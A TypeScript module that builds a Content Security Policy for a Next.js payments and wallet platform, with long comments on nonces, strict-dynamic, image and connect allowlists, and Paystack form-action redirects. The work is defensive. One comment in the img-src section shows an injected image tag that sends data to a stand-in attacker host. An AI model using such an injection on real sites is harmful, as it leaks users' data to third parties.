import { SUPABASE_URL } from "../supabase/env";

/**
 * The Content Security Policy.
 *
 * This was the largest outstanding security item on a platform that takes card
 * details, and the reason it stayed outstanding is written in KNOWN_GAPS: it
 * "needs a nonce strategy compatible with Next streaming". That turned out to
 * be the easy half. The hard half was deciding what it costs, and the answer
 * was measured rather than guessed: the production build renders 2 static
 * routes against 92 dynamic ones, so the usual objection to a per-request
 * nonce, that reading a header opts every page out of static rendering, is
 * worth almost nothing here. Ninety-two of ninety-four pages were already
 * dynamic because they read a session.
 *
 * What a CSP buys on THIS platform specifically: the checkout hands a guest to
 * Paystack and the wallet moves real money, so the attack that matters is a
 * script that should not be running reading a form or rewriting a destination.
 * `script-src` with a nonce and `strict-dynamic` means a script runs only if
 * this server minted it for this request, or was loaded by one that was. An
 * injected `<script>` in a listing description, a review, a support message or
 * an agent's own listing title carries no nonce and does not execute.
 *
 * ## It ships in report-only first, and that is not timidity
 *
 * A CSP that is wrong does not degrade, it deletes: a missed directive means a
 * blank page or a dead checkout, and the report is the only way to find the
 * ones nobody predicted. So `CSP_ENFORCE` decides the header name and defaults
 * to report-only. Report-only cannot break anything by construction, browsers
 * still report every violation to `/api/csp-report`, and flipping to enforce is
 * one environment variable once the reports are quiet. There is no second
 * policy to keep in step, because both modes serve the same string.
 */

/** Set to the literal "true" to enforce. Anything else, including a typo, reports. */
export function cspEnforced(): boolean {
  return process.env.CSP_ENFORCE === "true";
}

export function cspHeaderName(): string {
  return cspEnforced() ? "Content-Security-Policy" : "Content-Security-Policy-Report-Only";
}

/** Where violations are posted. Same origin, so it needs nothing in connect-src. */
export const CSP_REPORT_PATH = "/api/csp-report";

/** The request header the root layout reads to nonce its two inline scripts. */
export const NONCE_HEADER = "x-nonce";

/**
 * A fresh nonce, 128 bits, base64.
 *
 * `crypto.getRandomValues` rather than `Math.random`, because a guessable nonce
 * is not a nonce: the whole guarantee is that an attacker who can inject markup
 * cannot predict the token that would make it run. Web Crypto is used rather
 * than `node:crypto` so this works unchanged if the middleware ever runs on the
 * edge runtime.
 */
export function createNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return btoa(String.fromCharCode(...bytes));
}

/**
 * The Supabase origins the browser genuinely talks to, as CSP sources.
 *
 * Both schemes, because the client speaks REST and auth over https and realtime
 * over a websocket, and `connect-src` governs both. Derived from the public
 * project URL rather than hardcoded, so a project move follows the environment;
 * an absent or malformed URL yields nothing at all rather than a wildcard,
 * which keeps a keyless build's policy tighter than a configured one instead of
 * looser.
 */
function supabaseOrigins(): string[] {
  if (SUPABASE_URL.length === 0) return [];
  try {
    const { origin, host } = new URL(SUPABASE_URL);
    return [origin, `wss://${host}`];
  } catch {
    return [];
  }
}

/**
 * Every host this platform loads a picture from, as CSP sources.
 *
 * Kept in step with the `images.remotePatterns` allowlist in `next.config.ts`
 * by hand, because the two lists are read by different runtimes and there is
 * no shared module either of them can import. A host added there and forgotten
 * here shows a broken image; a host added here and forgotten there throws a
 * 500 out of the image optimiser. The second failure is louder, which is the
 * right way round.
 *
 * The Supabase storage origin is NOT in this list. It is added at call time
 * from `supabaseOrigins()`, so it follows the project URL rather than being
 * written down twice.
 */
const IMAGE_HOSTS: readonly string[] = [
  // Stock photography used by editorial surfaces.
  "https://images.unsplash.com",
  // The avatar a Google account already has. Google picks the shard, lh3
  // through lh6, so the wildcard is on the subdomain and nothing wider.
  "https://*.googleusercontent.com",
  // Basemap raster tiles. Both providers, because which one is drawn depends
  // on whether NEXT_PUBLIC_MAPTILER_KEY is set at runtime. See lib/maps/tiles.
  "https://basemaps.cartocdn.com",
  "https://api.maptiler.com",
];

/**
 * Where a payment is allowed to take somebody.
 *
 * Read by `form-action`, and by nothing else: no Paystack script runs in this
 * app and no browser code calls their API, so these origins are not in
 * `script-src` or `connect-src` and must not be added there without a reason
 * written down beside them.
 */
const PAYSTACK_ORIGINS: readonly string[] = [
  "https://checkout.paystack.com",
  "https://checkout.paystack.co",
  "https://standard.paystack.co",
  "https://paystack.com",
];

/**
 * The policy, for one request.
 *
 * Every directive below is either the strictest value that works or carries the
 * reason it cannot be.
 */
export function contentSecurityPolicy(nonce: string): string {
  const supabase = supabaseOrigins();

  const directives: [string, string[]][] = [
    // Everything not named below falls back to same origin only.
    ["default-src", ["'self'"]],

    /*
     * `strict-dynamic` is the point of the whole policy. Where it is supported
     * it makes the browser ignore `'self'` and every host in this directive,
     * and trust only scripts carrying this request's nonce plus whatever those
     * scripts load themselves. That last part is what lets Next's chunk loader
     * keep working without listing a single file.
     *
     * `'self'` and `https:` stay for browsers that do not implement
     * strict-dynamic, where they are the fallback rather than the rule. A
     * browser that understands strict-dynamic never reads them.
     */
    ["script-src", ["'self'", "https:", `'nonce-${nonce}'`, "'strict-dynamic'"]],

    /*
     * `'unsafe-inline'` for styles, honestly labelled rather than quietly
     * omitted. React writes every `style={{...}}` prop as an inline attribute
     * and Next inlines critical CSS during streaming, so removing this breaks
     * the rendering of most of the app. It is a far smaller risk than the
     * script equivalent: CSS injection can restyle a page, it cannot read a
     * card number or call an API.
     */
    ["style-src", ["'self'", "'unsafe-inline'"]],

    /*
     * Images used to be `https:`, a wildcard over every host on the web, and
     * exactly one thing justified it: LiteAPI served each partner hotel's
     * photos from whichever CDN that supplier happened to use, so the host set
     * was genuinely unknowable at build time.
     *
     * There are no partner photos any more. Every image on this platform now
     * comes from a host we can name, so the wildcard is closed and the list is
     * the real one. It is the same set `next.config.ts` allows `next/image` to
     * optimise, plus the two basemap providers, which serve raster tiles as
     * plain `<img>` elements and are therefore governed by this directive
     * rather than by `connect-src`.
     *
     * A photo that fails to load is a grey tile. A wildcard that stays open
     * because nobody revisited it is an exfiltration channel: an injected
     * `<img src="https://attacker/?=...">` is a GET to anywhere, carrying
     * whatever the URL was built from.
     */
    ["img-src", ["'self'", "data:", "blob:", ...IMAGE_HOSTS, ...supabase]],

    // Self-hosted faces only, and `data:` for nothing. See public/fonts.
    ["font-src", ["'self'"]],

    // The browser talks to us and to Supabase, and to nothing else at all.
    // Every payment call is server side, so Paystack does not belong here:
    // if a browser ever starts calling an API directly, this directive is
    // what reports it.
    ["connect-src", ["'self'", ...supabase]],

    // No plugins, no applets, ever.
    ["object-src", ["'none'"]],

    // Nothing may frame us, which is X-Frame-Options said in the modern
    // spelling. Both are sent: the old header for browsers that only read it.
    ["frame-ancestors", ["'none'"]],

    // We frame nothing either. No embedded checkout, no third-party widget.
    ["frame-src", ["'none'"]],

    // A `<base>` tag rewrite turns every relative URL on the page into an
    // attacker's, which is why this is pinned even though nothing sets one.
    ["base-uri", ["'self'"]],

    /*
     * `'self'` alone here was a live bug waiting on one environment variable.
     *
     * The old note said Paystack is reached by NAVIGATION to an
     * authorization_url rather than by a cross-origin form post, so
     * `form-action 'self'` could not affect the checkout. That is half right
     * and the wrong half is the one that breaks wallet funding. The deposit
     * flow submits a form to our own route, and that route answers with a
     * redirect to Paystack. Chrome applies `form-action` to the ENTIRE
     * redirect chain a form submission follows, not only to its first hop, so
     * a same-origin POST that redirects off site is blocked by `'self'` just
     * as a cross-origin POST would be. Firefox does not do this, which is
     * exactly how a bug like this reaches production: it works on the machine
     * of whoever tested it.
     *
     * Nothing is wrong today only because `CSP_ENFORCE` is unset and the
     * policy is report-only. The day it is set to "true", every deposit dies
     * at the redirect with a console error and no server-side trace. So the
     * Paystack origins are named now, while the cost of being wrong is a
     * report rather than a dead checkout.
     *
     * Both TLDs are listed because Paystack has used both: older integrations
     * are redirected to `checkout.paystack.com` and newer ones to
     * `checkout.paystack.co`, the choice is made by their API rather than by
     * us, and an authorization_url is opaque to this codebase.
     */
    ["form-action", ["'self'", ...PAYSTACK_ORIGINS]],

    // A service worker is registered (public/sw.js), and it may be created
    // from a blob by the framework's own loader.
    ["worker-src", ["'self'", "blob:"]],
    ["manifest-src", ["'self'"]],
  ];

  const policy = directives
    .map(([name, values]) => `${name} ${values.join(" ")}`)
    .join("; ");

  /*
   * `report-uri` is deprecated and `report-to` is its replacement, and both are
   * sent because neither is universally supported: Firefox still reads only the
   * deprecated one and some Chromium versions want the Reporting-Endpoints
   * header that `report-to` refers to. Sending both means the reports arrive
   * whatever the reader is using, which matters most in exactly the phase this
   * policy is in, where the reports ARE the deliverable.
   */
  return `${policy}; report-uri ${CSP_REPORT_PATH}; report-to csp`;
}

/** The header that gives `report-to csp` above somewhere to point. */
export const REPORTING_ENDPOINTS = `csp="${CSP_REPORT_PATH}"`;
